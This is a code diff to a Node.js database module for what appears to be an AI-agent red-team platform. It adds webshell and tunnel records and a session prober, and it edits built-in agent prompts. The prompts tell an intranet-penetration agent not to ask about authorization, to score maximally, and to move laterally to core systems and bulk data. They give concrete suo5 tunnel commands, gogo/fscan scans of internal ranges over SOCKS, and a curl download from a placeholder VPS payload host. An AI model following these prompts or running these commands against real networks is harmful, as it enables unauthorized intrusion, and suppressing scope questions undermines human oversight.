@@ -6,6 +6,7 @@
  * 两者共用本模块，保证「界面看到的」「智能体查到的」「命令行验的」是同一份实现。
  */
 import { DatabaseSync } from 'node:sqlite'
+import { connect as tcpConnect } from 'node:net'
 import {
   mkdirSync, readFileSync, writeFileSync, readdirSync, existsSync, rmSync, statSync,
   copyFileSync,
@@ -168,6 +169,25 @@ CREATE TABLE IF NOT EXISTS access_session (
   session_ref TEXT, note TEXT, found_by_agent TEXT, obtained_at TEXT
 );
 
+/* WebShell：已经上线的可控入口。智能体随时可以复用，避免"打到最后忘了还有 webshell" */
+CREATE TABLE IF NOT EXISTS webshell (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  asset_id INTEGER, url TEXT NOT NULL, shell_type TEXT, pass_key TEXT,
+  secret_ref TEXT, privilege TEXT,
+  status TEXT DEFAULT 'unknown', last_check TEXT, check_note TEXT, latency_ms INTEGER,
+  note TEXT, found_by_agent TEXT, created_at TEXT, updated_at TEXT,
+  UNIQUE(url, pass_key)
+);
+
+/* 内网隧道：suo5 / socks5 / ssh -R / frp 等。记录入口、监听地址与可达网段 */
+CREATE TABLE IF NOT EXISTS tunnel (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  asset_id INTEGER, webshell_id INTEGER, kind TEXT, listen TEXT,
+  entry TEXT, reach TEXT,
+  status TEXT DEFAULT 'unknown', last_check TEXT, check_note TEXT, latency_ms INTEGER,
+  pid TEXT, command TEXT, note TEXT, found_by_agent TEXT, created_at TEXT, updated_at TEXT
+);
+
 /* HTTP 证据：原始请求/响应，可直接粘贴进 Burp Suite / Yakit 复现 */
 CREATE TABLE IF NOT EXISTS http_evidence (
   id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -214,6 +234,8 @@ CREATE INDEX IF NOT EXISTS ix_vuln_sev ON vuln(severity, status);
 CREATE INDEX IF NOT EXISTS ix_vuln_cve ON vuln(cve);
 CREATE INDEX IF NOT EXISTS ix_cred_host ON credential(host);
 CREATE INDEX IF NOT EXISTS ix_access_host ON access_session(host);
+CREATE INDEX IF NOT EXISTS ix_webshell_status ON webshell(status);
+CREATE INDEX IF NOT EXISTS ix_tunnel_status ON tunnel(status);
 CREATE INDEX IF NOT EXISTS ix_http_vuln ON http_evidence(vuln_id);
 CREATE INDEX IF NOT EXISTS ix_http_asset ON http_evidence(asset_id);
 CREATE INDEX IF NOT EXISTS ix_step_seq ON attack_step(seq, id);
@@ -287,6 +309,49 @@ function migrate(db) {
   ensure('asset', 'assess_reason', 'TEXT')
   ensure('asset', 'assessed_at', 'TEXT')
   ensure('asset', 'assessed_by', 'TEXT')
+  /* 内外网维度：internal（内网/私网地址）| external（互联网可达）。手工指定优先于自动推导 */
+  ensure('asset', 'scope', 'TEXT')
+  /* 通过这个漏洞拿到了什么：账号权限 / 服务器权限 / 内网隧道 / 得分点等 */
+  ensure('vuln', 'gained', 'TEXT')
+  /* 老库回填：按 IP 归属自动区分内外网 */
+  try {
+    db.exec(`UPDATE asset SET scope = (${SCOPE_SQL}) WHERE scope IS NULL OR scope = ''`)
+  } catch { /* 首次建库时表为空，忽略 */ }
+}
+
+/** 把「通过这个漏洞拿到了什么」规范化成一行短标签：数组或分隔串 → 「A、B」。 */
+function normGained(value) {
+  if (value === undefined || value === null) return null
+  const parts = Array.isArray(value) ? value : String(value).split(/[,;，；]/)
+  const out = parts.map((x) => String(x).trim()).filter(Boolean)
+  return out.length > 0 ? out.join('、') : null
+}
+
+/**
+ * 内外网判定（SQL 片段，作用于 asset.ip）：
+ * RFC1918 私网 + 回环 + 链路本地 + CGNAT 视为内网，其余为外网。
+ */
+const SCOPE_SQL = `CASE
+  WHEN ip LIKE '10.%' OR ip LIKE '192.168.%' OR ip LIKE '127.%' OR ip LIKE '169.254.%'
+    OR (ip LIKE '172.%' AND CAST(substr(ip, 5, instr(substr(ip, 5), '.') - 1) AS INTEGER) BETWEEN 16 AND 31)
+    OR (ip LIKE '100.%' AND CAST(substr(ip, 5, instr(substr(ip, 5), '.') - 1) AS INTEGER) BETWEEN 64 AND 127)
+  THEN 'internal' ELSE 'external' END`
+
+/** JS 侧同样的判定，用于写入新资产时即时打标。 */
+export function scopeOfIp(ip) {
+  const s = String(ip || '')
+  if (/^(10\.|192\.168\.|127\.|169\.254\.)/.test(s)) return 'internal'
+  const m = /^172\.(\d{1,3})\./.exec(s)
+  if (m !== null) {
+    const n = Number(m[1])
+    if (n >= 16 && n <= 31) return 'internal'
+  }
+  const c = /^100\.(\d{1,3})\./.exec(s)
+  if (c !== null) {
+    const n = Number(c[1])
+    if (n >= 64 && n <= 127) return 'internal'
+  }
+  return 'external'
 }
 
 /* ------------------------------------------------------------------ 元数据 */
@@ -353,6 +418,12 @@ export const DEFAULT_PROMPTS = {
    - **同 C 段特征比对**：把已确认资产的 title / body / 页脚版权 / 备案号 / logo 特征在同段内逐个比对，命中但未被公开解析的 IP 就是隐藏资产。
 5. **归属与关联**：证书 SAN、whois / ASN、备案主体、C 段归属，顺藤摸瓜找同主体其它资产。
 
+## 工具与技能优先（禁止手搓脚本）
+- 动手前先加载对应技能（用原生 \`skill\` 工具）：信息收集 passive-recon / fofa-recon / active-scan / web-fingerprint；浏览器 browser-automation / kimi-webbridge；代理 cn-proxy-pool。
+- 优先用现成工具：nmap/masscan/fscan/gogo 扫描，httpx/gogo 指纹，ffuf/dirsearch 目录，nuclei POC。
+- **不要手搓 HTTP 爆破循环或端口扫描脚本**；现成工具确实不适用时才写，并说明理由。
+- 开工前先 \`redteam_sessions\` 看有没有现成 WebShell / 隧道 / 凭据可直接复用。
+
 ## 常规采集（别漏）
 域名 / 子域、IP 与 C 段、端口 / 服务 / 版本 / 指纹、Web 的 URL 与页面标题，标注被动 / 主动来源。
 
@@ -390,6 +461,12 @@ export const DEFAULT_PROMPTS = {
 3. **每次被封都要记录**（blocked=true）。官方门户/邮箱被封就直接跳过——把时间留给边缘资产。
 4. 明知被封还继续高频打同一目标 = 浪费预算 + 触发告警，禁止。
 
+## 工具与技能优先（禁止手搓脚本）
+- 动手前先加载对应技能（用原生 \`skill\` 工具）：信息收集 passive-recon / fofa-recon / active-scan / web-fingerprint；浏览器 browser-automation / kimi-webbridge；代理 cn-proxy-pool。
+- 优先用现成工具：nmap/masscan/fscan/gogo 扫描，httpx/gogo 指纹，ffuf/dirsearch 目录，nuclei POC。
+- **不要手搓 HTTP 爆破循环或端口扫描脚本**；现成工具确实不适用时才写，并说明理由。
+- 开工前先 \`redteam_sessions\` 看有没有现成 WebShell / 隧道 / 凭据可直接复用。
+
 ## 其次：接口与逻辑漏洞（拿账号/数据）
 Nday 打不通或已覆盖，转接口：
 1. **抓接口**：前端 JS（axios/fetch 路径、webpack chunk）、swagger/openapi.json、actuator、druid、graphql、小程序/APP 抓包。
@@ -422,6 +499,11 @@ Nday 打不通或已覆盖，转接口：
 4. **拿到服务器权限后**：收集凭据与配置 → 用 \`suo5-tunnel\` 建隧道打内网 → 转交内网渗透角色。
 5. 每一步成果**立刻记分**：\`redteam_score_hit\`（webshell / server-shell / web-account-admin / rce / db-access / sensitive-data …）。
 
+## 拿到 WebShell / 隧道后必须登记（否则等于没拿到）
+- 上线 WebShell → 立刻 \`redteam_webshell_add\`（url / shell_type / pass_key / privilege / secret_ref）。
+- 建好隧道 → 立刻 \`redteam_tunnel_add\`（kind / listen / entry / reach / command），并用 \`redteam_session_check\` 实测一次连通性。
+- 后续内网阶段会直接复用这些入口；不登记就等于把入口丢了（技能 \`suo5-tunnel\` 建隧道，细节见 \`fscan-intranet\` / \`gogo-intranet\` 的隧道用法）。
+
 ## 其它拿分路径（并行推进）
 1. **站点权限** → 后台 getshell、越权拿管理员、批量导出用户数据。
 2. **服务器权限** → 文件上传 / 命令执行 / 反序列化 / 框架 RCE（技能 \`webshell-toolkit\`）。
@@ -443,9 +525,18 @@ Nday 打不通或已覆盖，转接口：
 ## 角色
 你是内网渗透智能体。演练已获授权，**不要询问授权范围**。已有外网入口（WebShell / 会话 / 凭据）时接手，目标是**把分数拉满**：互联网边界突破、逻辑内网突破、核心系统、批量数据。
 
-## 工作流
-1. **建立通道**：用 suo5 起 SOCKS5 隧道（\`suo5-linux-amd64 -t <webshell-url> -l 1080\`）；确认隧道可用后所有内网探测走它。
-2. **内网测绘**：经隧道扫内网 C 段（\`nmap -sT -Pn\`，速率降到 \`-T2 --max-rate 50\`），新发现资产用 \`redteam_asset_add\` 并入测绘（自动按 /24 建 C 段）。
+## 工作流（拿到 shell 后的铁律）
+0. **先看已有入口**：开工第一个动作是 \`redteam_sessions\` —— 也许已经有可用的 WebShell 或隧道，不要重复造。
+1. **建立通道（必须用技能，不要手搓）**：
+   - 加载技能 \`suo5-tunnel\`，用 suo5 通过 WebShell/HTTP 建 SOCKS5 隧道（\`suo5-linux-amd64 -t <webshell-url> -l 1080\`）；
+   - 建好**立刻登记**：\`redteam_tunnel_add\`（kind=suo5、listen=127.0.0.1:1080、entry=WebShell URL、reach=可达网段、command=完整命令）；WebShell 本身用 \`redteam_webshell_add\` 登记；
+   - 用 \`redteam_session_check\` 让 host 侧实测一次连通性，确认 status=active 再往下走。
+2. **内网测绘（必须用技能里的现成扫描器，不要手搓脚本）**：
+   - 先加载技能 \`gogo-intranet\` 铺面：\`./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af --proxy socks5://127.0.0.1:1080\`
+   - 再加载技能 \`fscan-intranet\` 打点：\`./fscan -h 10.0.0.0/24 -np -nobr -nopoc -socks5 127.0.0.1:1080 -o intranet.txt\`
+   - 两者都能从 VPS 载荷服务取：\`curl -o gogo http://<你的VPS_IP>:9100/gogo\`（VPS 地址见技能 vps-reverse-shell）
+   - **禁止手搓内网探测脚本**（bash for 循环扫端口、自己写并发 HTTP 探测）；现成工具不适用时必须说明理由。
+   - 新发现资产用 \`redteam_asset_add\` 并入测绘（自动按 /24 建 C 段，并自动区分内网/外网）。
 3. **凭据复用**：\`redteam_credential_list\` / \`redteam_access_list\` 盘点已有账号、哈希、密钥；优先用已有凭据横向（避免爆破告警），尝试 SSH/RDP/SMB/WinRM/数据库/中间件/后台。
 4. **横向移动**：Pass-the-Hash / 票据、弱口令、未授权服务、已知漏洞（MS17-010、Shiro/Fastjson/Weblogic 等）。
 5. **打核心系统**：域控、堡垒机、运维平台、代码仓库、数据库集群、备份系统 —— 拿到即记分（code=core-system）。
@@ -457,9 +548,11 @@ Nday 打不通或已覆盖，转接口：
 - 每完成一步立即 \`redteam_score_hit\`，并写 \`redteam_chain_add\`，保证攻击链闭合：入口 → 权限 → 横向 → 目标。
 
 ## 落库（强制）
+- **入口类必须先登记再用**：WebShell → \`redteam_webshell_add\`；隧道 → \`redteam_tunnel_add\`。登记后其他角色和后续会话都能复用。
 - 每个内网资产 \`redteam_asset_add\`；每次成功访问 \`redteam_access_add\`；每条凭据 \`redteam_credential_add\`。
 - 每个关键动作 \`redteam_chain_add\`（stage=pivot/access/data）。
-- 定期 \`redteam_score_list\` 看还差哪些高分项，优先补高分缺口。
+- 隧道/WebShell 失效立刻 \`redteam_tunnel_update\` / \`redteam_webshell_update\` 标为 down，并说明原因。
+- 定期 \`redteam_sessions\` 复盘可用入口，\`redteam_score_list\` 看还差哪些高分项。
 
 ## 交付
 内网拓扑与已控资产、凭据清单、横向路径、核心系统战果、数据规模与当前得分。`,
@@ -510,6 +603,13 @@ export function dispatch(store, req = {}) {
     if (op === 'addCredential') return Object.assign({ ok: true }, store.addCredential(id, req.credential || req))
     if (op === 'access') return { ok: true, items: store.listAccess(id, req) }
     if (op === 'addAccess') return Object.assign({ ok: true }, store.addAccess(id, req.access || req))
+    if (op === 'sessions') return Object.assign({ ok: true }, store.sessionSummary(id))
+    if (op === 'webshells') return { ok: true, items: store.listWebshells(id, req) }
+    if (op === 'addWebshell') return Object.assign({ ok: true }, store.addWebshell(id, req.webshell || req))
+    if (op === 'updateWebshell') return Object.assign({ ok: true }, store.updateWebshell(id, req.id, req.patch || req))
+    if (op === 'tunnels') return { ok: true, items: store.listTunnels(id, req) }
+    if (op === 'addTunnel') return Object.assign({ ok: true }, store.addTunnel(id, req.tunnel || req))
+    if (op === 'updateTunnel') return Object.assign({ ok: true }, store.updateTunnel(id, req.id, req.patch || req))
     if (op === 'domains') return { ok: true, items: store.domainIndex(id, req) }
     if (op === 'web') return Object.assign({ ok: true }, store.listWeb(id, req))
     if (op === 'httpEvidence') return { ok: true, items: store.listHttpEvidence(id, req) }
@@ -531,10 +631,29 @@ export function dispatch(store, req = {}) {
     if (op === 'import') return Object.assign({ ok: true }, store.importBundle(id, req))
     if (op === 'prompts') return { ok: true, roles: store.listPrompts(id) }
     if (op === 'savePrompt') return Object.assign({ ok: true }, store.savePrompt(id, req.role, req.content))
+    if (op === 'resetPrompts') return Object.assign({ ok: true }, store.resetPrompts(id, req.role))
     throw new Error(`unknown op: ${op}`)
   } catch (error) {
     return { ok: false, error: error && error.message ? error.message : String(error) }
   }
+}
+
+/**
+ * 异步分发：只多一条 `probeSessions`（需要真实发起网络连接），其余转发给同步 dispatch。
+ * 智能体的沙箱里连不出去，所以在 host 侧做连通性实测。
+ */
+export async function dispatchAsync(store, req = {}) {
+  if (req.op === 'probeSessions') {
+    try {
+      const id = req.engagement
+      if (!id) throw new Error('engagement required')
+      const result = await store.probeSessions(id, req)
+      return Object.assign({ ok: true }, result)
+    } catch (error) {
+      return { ok: false, error: error && error.message ? error.message : String(error) }
+    }
+  }
+  return dispatch(store, req)
 }
 
 /* ------------------------------------------------------------------ 服务 */
@@ -677,7 +796,7 @@ export class RedteamStore {
   }
 
   listSegments(id) {
-    return this.db(id).prepare(`
+    const rows = this.db(id).prepare(`
       SELECT s.cidr, s.org, s.asn, s.country, s.city, s.source,
         (SELECT COUNT(*) FROM asset a WHERE a.segment_cidr = s.cidr) AS assets,
         (SELECT COUNT(*) FROM asset a WHERE a.segment_cidr = s.cidr AND a.state = 'live') AS live,
@@ -685,6 +804,8 @@ export class RedteamStore {
         (SELECT COUNT(*) FROM port p JOIN asset a ON a.id = p.asset_id WHERE a.segment_cidr = s.cidr AND p.provenance = 'passive') AS passive_ports,
         (SELECT COUNT(*) FROM port p JOIN asset a ON a.id = p.asset_id WHERE a.segment_cidr = s.cidr AND p.provenance = 'active') AS active_ports
       FROM segment s ORDER BY assets DESC, s.cidr`).all()
+    /* C 段也分内外网：按网段起始地址归属判定 */
+    return rows.map((r) => Object.assign({}, r, { scope: scopeOfIp(String(r.cidr || '').split('/')[0]) }))
   }
 
   assetRow(db, a) {
@@ -702,6 +823,7 @@ export class RedteamStore {
       test_updated_by: a.test_updated_by || null, blocked_count: a.blocked_count || 0,
       priority: a.priority || null, potential: a.potential || '', assess_reason: a.assess_reason || '',
       assessed_at: a.assessed_at || null, assessed_by: a.assessed_by || null,
+      scope: a.scope || scopeOfIp(a.ip),
       open_ports: ports.filter((p) => p.state === 'open').length,
       ports, fingerprints, names,
       passive: ports.filter((p) => p.provenance === 'passive').length,
@@ -736,6 +858,11 @@ export class RedteamStore {
     if (f.test_status) {
       where.push("COALESCE(a.test_status, 'untested') = ?")
       args.push(f.test_status)
+    }
+    /* 内外网维度：internal | external（老数据在迁移时已回填） */
+    if (f.scope) {
+      where.push(`COALESCE(a.scope, (${SCOPE_SQL})) = ?`)
+      args.push(f.scope)
     }
     if (f.q) {
       const terms = String(f.q).split(/\s+/).filter(Boolean)
@@ -982,18 +1109,18 @@ export class RedteamStore {
           title = COALESCE(?, title), severity = ?, status = COALESCE(?, status),
           evidence = COALESCE(?, evidence), confidence = COALESCE(?, confidence),
           source = COALESCE(?, source), target = COALESCE(?, target),
-          found_by_agent = COALESCE(?, found_by_agent)
+          found_by_agent = COALESCE(?, found_by_agent), gained = COALESCE(?, gained)
         WHERE id = ?`).run(
         v.title ?? null, severity, v.status ?? null, v.evidence ?? null, v.confidence ?? null,
-        v.source ?? null, v.target ?? null, v.found_by_agent ?? null, existing.id,
+        v.source ?? null, v.target ?? null, v.found_by_agent ?? null, normGained(v.gained), existing.id,
       )
       return { id: existing.id, updated: true }
     }
-    const result = db.prepare(`INSERT INTO vuln(asset_id, port_id, cve, title, severity, source, confidence, status, evidence, target, found_by_agent, found_at)
-      VALUES(?,?,?,?,?,?,?,?,?,?,?,?)`).run(
+    const result = db.prepare(`INSERT INTO vuln(asset_id, port_id, cve, title, severity, source, confidence, status, evidence, target, gained, found_by_agent, found_at)
+      VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
       v.asset_id ?? null, v.port_id ?? null, v.cve ?? null, v.title ?? null, severity,
       v.source ?? null, v.confidence ?? null, status, v.evidence ?? null, v.target ?? null,
-      v.found_by_agent ?? null, nowIso(),
+      normGained(v.gained), v.found_by_agent ?? null, nowIso(),
     )
     const vulnId = Number(result.lastInsertRowid)
     if (v.asset_id !== undefined && v.asset_id !== null) {
@@ -1023,6 +1150,15 @@ export class RedteamStore {
       FROM vuln v LEFT JOIN asset a ON a.id = v.asset_id ${clause}
       ORDER BY CASE v.severity WHEN 'critical' THEN 0 WHEN 'high' THEN 1 WHEN 'medium' THEN 2 WHEN 'low' THEN 3 ELSE 4 END,
                v.id DESC LIMIT ?`).all(...args, limit)
+    /* 详情里要直接展示原始请求/响应，这里一并带上（请求体可能很大，做长度保护） */
+    const eviStmt = db.prepare(`SELECT id, label, method, url, status, request, response, note, captured_by, captured_at
+      FROM http_evidence WHERE vuln_id = ? ORDER BY id`)
+    const clipped = (t) => (t === null || t === undefined ? null : (String(t).length > 60000 ? String(t).slice(0, 60000) + '\n…（截断）' : String(t)))
+    for (const item of items) {
+      item.http_evidence = eviStmt.all(item.id).map((e) => Object.assign({}, e, {
+        request: clipped(e.request), response: clipped(e.response),
+      }))
+    }
     return { total, items }
   }
 
@@ -1030,11 +1166,12 @@ export class RedteamStore {
     const db = this.db(id)
     const current = db.prepare('SELECT * FROM vuln WHERE id = ?').get(Number(vulnId))
     if (current === undefined) return { updated: false }
-    db.prepare(`UPDATE vuln SET status = ?, severity = ?, evidence = COALESCE(?, evidence), confidence = COALESCE(?, confidence)
+    db.prepare(`UPDATE vuln SET status = ?, severity = ?, evidence = COALESCE(?, evidence), confidence = COALESCE(?, confidence),
+        gained = COALESCE(?, gained), title = COALESCE(?, title)
       WHERE id = ?`).run(
       VULN_STATUSES.includes(patch.status) ? patch.status : current.status,
       SEVERITIES.includes(patch.severity) ? patch.severity : current.severity,
-      patch.evidence ?? null, patch.confidence ?? null, Number(vulnId),
+      patch.evidence ?? null, patch.confidence ?? null, normGained(patch.gained), patch.title ?? null, Number(vulnId),
     )
     return { updated: true, id: Number(vulnId) }
   }
@@ -1102,6 +1239,197 @@ export class RedteamStore {
     const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
     const limit = Math.min(Number(f.limit) || 200, 1000)
     return db.prepare(`SELECT * FROM access_session ${clause} ORDER BY id DESC LIMIT ?`).all(...args, limit)
+  }
+
+  /* ---------- WebShell 与隧道：打的过程中随时可复用的资产 ---------- */
+
+  /**
+   * 登记一个已上线的 WebShell。同一 url+pass_key 视为同一条，重复登记即刷新。
+   * @param w - `{ url, shell_type, pass_key, secret_ref, privilege, status, note, asset_id, found_by_agent }`
+   */
+  addWebshell(id, w = {}) {
+    const db = this.db(id)
+    if (!w.url) throw new Error('webshell.url required')
+    const ts = nowIso()
+    const existing = db.prepare('SELECT id FROM webshell WHERE url = ? AND COALESCE(pass_key, \'\') = COALESCE(?, \'\')')
+      .get(w.url, w.pass_key ?? null)
+    if (existing !== undefined) {
+      db.prepare(`UPDATE webshell SET shell_type = COALESCE(?, shell_type), secret_ref = COALESCE(?, secret_ref),
+        privilege = COALESCE(?, privilege), status = COALESCE(?, status), note = COALESCE(?, note),
+        asset_id = COALESCE(?, asset_id), updated_at = ? WHERE id = ?`)
+        .run(w.shell_type ?? null, w.secret_ref ?? null, w.privilege ?? null, w.status ?? 'online',
+          w.note ?? null, w.asset_id ?? null, ts, existing.id)
+      return { id: Number(existing.id), updated: true }
+    }
+    const result = db.prepare(`INSERT INTO webshell(asset_id, url, shell_type, pass_key, secret_ref, privilege,
+      status, note, found_by_agent, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?)`)
+      .run(w.asset_id ?? null, w.url, w.shell_type ?? null, w.pass_key ?? null, w.secret_ref ?? null,
+        w.privilege ?? null, w.status ?? 'online', w.note ?? null, w.found_by_agent ?? null, ts, ts)
+    if (w.asset_id !== undefined && w.asset_id !== null) {
+      this.#observe(db, 'asset', w.asset_id, 'webshell', w.url, 'active', 'exploit', null)
+    }
+    return { id: Number(result.lastInsertRowid), updated: false }
+  }
+
+  listWebshells(id, f = {}) {
+    const db = this.db(id)
+    const where = []
+    const args = []
+    if (f.status) { where.push('status = ?'); args.push(f.status) }
+    if (f.asset_id) { where.push('asset_id = ?'); args.push(f.asset_id) }
+    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
+    const limit = Math.min(Number(f.limit) || 200, 1000)
+    return db.prepare(`SELECT w.*, a.ip AS asset_ip FROM webshell w
+      LEFT JOIN asset a ON a.id = w.asset_id ${clause} ORDER BY w.id DESC LIMIT ?`).all(...args, limit)
+  }
+
+  updateWebshell(id, wsId, patch = {}) {
+    const db = this.db(id)
+    const fields = ['status', 'check_note', 'latency_ms', 'last_check', 'privilege', 'note', 'secret_ref', 'shell_type']
+    const sets = []
+    const args = []
+    for (const key of fields) {
+      if (patch[key] !== undefined) { sets.push(`${key} = ?`); args.push(patch[key]) }
+    }
+    if (sets.length === 0) throw new Error('nothing to update')
+    sets.push('updated_at = ?'); args.push(nowIso())
+    const result = db.prepare(`UPDATE webshell SET ${sets.join(', ')} WHERE id = ?`).run(...args, wsId)
+    if (result.changes === 0) throw new Error('webshell not found')
+    return { updated: true }
+  }
+
+  /** 登记一条内网隧道（suo5 / socks5 / ssh -R / frp …）。 */
+  addTunnel(id, t = {}) {
+    const db = this.db(id)
+    const ts = nowIso()
+    const result = db.prepare(`INSERT INTO tunnel(asset_id, webshell_id, kind, listen, entry, reach,
+      status, pid, command, note, found_by_agent, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)`)
+      .run(t.asset_id ?? null, t.webshell_id ?? null, t.kind ?? 'socks5', t.listen ?? null, t.entry ?? null,
+        t.reach ?? null, t.status ?? 'active', t.pid ?? null, t.command ?? null, t.note ?? null,
+        t.found_by_agent ?? null, ts, ts)
+    if (t.asset_id !== undefined && t.asset_id !== null) {
+      this.#observe(db, 'asset', t.asset_id, 'tunnel', `${t.kind || 'socks5'} ${t.listen || ''}`.trim(), 'active', 'exploit', null)
+    }
+    return { id: Number(result.lastInsertRowid) }
+  }
+
+  listTunnels(id, f = {}) {
+    const db = this.db(id)
+    const where = []
+    const args = []
+    if (f.status) { where.push('t.status = ?'); args.push(f.status) }
+    if (f.asset_id) { where.push('t.asset_id = ?'); args.push(f.asset_id) }
+    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
+    const limit = Math.min(Number(f.limit) || 200, 1000)
+    return db.prepare(`SELECT t.*, a.ip AS asset_ip, w.url AS webshell_url FROM tunnel t
+      LEFT JOIN asset a ON a.id = t.asset_id
+      LEFT JOIN webshell w ON w.id = t.webshell_id ${clause} ORDER BY t.id DESC LIMIT ?`).all(...args, limit)
+  }
+
+  updateTunnel(id, tId, patch = {}) {
+    const db = this.db(id)
+    const fields = ['status', 'check_note', 'latency_ms', 'last_check', 'listen', 'reach', 'pid', 'command', 'note']
+    const sets = []
+    const args = []
+    for (const key of fields) {
+      if (patch[key] !== undefined) { sets.push(`${key} = ?`); args.push(patch[key]) }
+    }
+    if (sets.length === 0) throw new Error('nothing to update')
+    sets.push('updated_at = ?'); args.push(nowIso())
+    const result = db.prepare(`UPDATE tunnel SET ${sets.join(', ')} WHERE id = ?`).run(...args, tId)
+    if (result.changes === 0) throw new Error('tunnel not found')
+    return { updated: true }
+  }
+
+  /** 会话总览：给界面和提示词用的一屏摘要（含在线/离线统计）。 */
+  sessionSummary(id) {
+    const db = this.db(id)
+    const shells = db.prepare(`SELECT w.*, a.ip AS asset_ip FROM webshell w
+      LEFT JOIN asset a ON a.id = w.asset_id ORDER BY w.id DESC`).all()
+    const tunnels = db.prepare(`SELECT t.*, a.ip AS asset_ip, w.url AS webshell_url FROM tunnel t
+      LEFT JOIN asset a ON a.id = t.asset_id LEFT JOIN webshell w ON w.id = t.webshell_id ORDER BY t.id DESC`).all()
+    const creds = db.prepare('SELECT COUNT(*) AS n FROM credential').get()
+    const access = db.prepare('SELECT COUNT(*) AS n FROM access_session').get()
+    return {
+      webshells: shells, tunnels,
+      totals: {
+        webshells: shells.length,
+        webshellsOnline: shells.filter((s) => s.status === 'online').length,
+        tunnels: tunnels.length,
+        tunnelsActive: tunnels.filter((s) => s.status === 'active').length,
+        credentials: creds ? creds.n : 0,
+        access: access ? access.n : 0,
+      },
+    }
+  }
+
+  /**
+   * 实测连通性（host 平面专有：智能体跑在沙箱里，只有这里能直接发起连接）。
+   * WebShell 发一次不带参数的 GET；隧道做一次 TCP 连接。
+   * 结果回写 status / last_check / latency_ms / check_note。
+   */
+  async probeSessions(id, options = {}) {
+    const timeout = Math.min(Math.max(Number(options.timeoutMs) || 6000, 1000), 20000)
+    const out = { webshells: [], tunnels: [], checkedAt: nowIso() }
+
+    for (const s of this.listWebshells(id, { limit: 500 })) {
+      const started = Date.now()
+      let status = 'offline'
+      let note = ''
+      try {
+        const controller = new AbortController()
+        const timer = setTimeout(() => controller.abort(), timeout)
+        const res = await fetch(s.url, { method: 'GET', redirect: 'manual', signal: controller.signal })
+        clearTimeout(timer)
+        status = res.status < 500 ? 'online' : 'offline'
+        note = `HTTP ${res.status}`
+      } catch (error) {
+        note = error && error.name === 'AbortError' ? `超时 >${timeout}ms` : String((error && error.message) || error).slice(0, 160)
+      }
+      const latency = Date.now() - started
+      try {
+        this.updateWebshell(id, s.id, { status, last_check: nowIso(), latency_ms: latency, check_note: note })
+      } catch { /* ignore */ }
+      out.webshells.push({ id: s.id, url: s.url, status, note, latency_ms: latency })
+    }
+
+    for (const t of this.listTunnels(id, { limit: 500 })) {
+      const target = String(t.listen || '').replace(/^socks5:\/\//, '').replace(/^https?:\/\//, '')
+      const started = Date.now()
+      let status = 'down'
+      let note = ''
+      if (target === '') {
+        note = '缺少 listen 地址，无法探测'
+      } else {
+        const idx = target.lastIndexOf(':')
+        const host = idx > 0 ? target.slice(0, idx) : '127.0.0.1'
+        const port = Number(idx > 0 ? target.slice(idx + 1) : target)
+        if (!Number.isFinite(port) || port <= 0) {
+          note = `无法解析端口：${t.listen}`
+        } else {
+          note = await new Promise((resolve) => {
+            let done = false
+            const socket = tcpConnect({ host, port })
+            const finish = (ok, text) => {
+              if (done) return
+              done = true
+              try { socket.destroy() } catch { /* ignore */ }
+              resolve(ok ? '' : text)
+            }
+            socket.setTimeout(timeout)
+            socket.on('connect', () => { status = 'active'; finish(true, '') })
+            socket.on('timeout', () => { finish(false, `超时 >${timeout}ms`) })
+            socket.on('error', (error) => { finish(false, String((error && error.code) || (error && error.message) || error).slice(0, 120)) })
+          })
+        }
+      }
+      const latency = Date.now() - started
+      try {
+        this.updateTunnel(id, t.id, { status, last_check: nowIso(), latency_ms: latency, check_note: note })
+      } catch { /* ignore */ }
+      out.tunnels.push({ id: t.id, kind: t.kind, listen: t.listen, status, note, latency_ms: latency })
+    }
+    return out
   }
 
   /**
@@ -1572,14 +1900,15 @@ export class RedteamStore {
     const cidr = a.segment_cidr || cidrOf(a.ip)
     this.#upsertSegment(db, { cidr, source: a.provenance, first_seen: a.first_seen })
     const t = nowIso()
-    db.prepare(`INSERT INTO asset(segment_cidr, ip, ip_int, state, primary_name, confidence, first_seen, last_seen)
-      VALUES(?,?,?,?,?,?,?,?)
+    db.prepare(`INSERT INTO asset(segment_cidr, ip, ip_int, state, primary_name, confidence, first_seen, last_seen, scope)
+      VALUES(?,?,?,?,?,?,?,?,?)
       ON CONFLICT(segment_cidr, ip) DO UPDATE SET
         state = COALESCE(excluded.state, asset.state),
         primary_name = COALESCE(excluded.primary_name, asset.primary_name),
+        scope = COALESCE(NULLIF(asset.scope, ''), excluded.scope),
         last_seen = excluded.last_seen`).run(
       cidr, a.ip, ipToInt(a.ip), a.state ?? 'unknown', a.primary_name ?? null, a.confidence ?? null,
-      a.first_seen ?? t, t,
+      a.first_seen ?? t, t, a.scope || scopeOfIp(a.ip),
     )
     return db.prepare('SELECT id FROM asset WHERE segment_cidr = ? AND ip = ?').get(cidr, a.ip).id
   }
@@ -1717,6 +2046,17 @@ export class RedteamStore {
         updated_at: exists ? statSync(p).mtime.toISOString() : null,
       }
     })
+  }
+
+  /** 把角色提示词恢复成内置默认（用户在界面上改坏了 / 老靶标要用新版提示词时用）。 */
+  resetPrompts(id, role) {
+    if (role !== undefined && role !== null) {
+      this.savePrompt(id, role, DEFAULT_PROMPTS[role] || '')
+      return { reset: [role] }
+    }
+    const done = []
+    for (const r of Object.keys(ROLE_TITLES)) { this.savePrompt(id, r, DEFAULT_PROMPTS[r] || ''); done.push(r) }
+    return { reset: done }
   }
 
   savePrompt(id, role, content) {
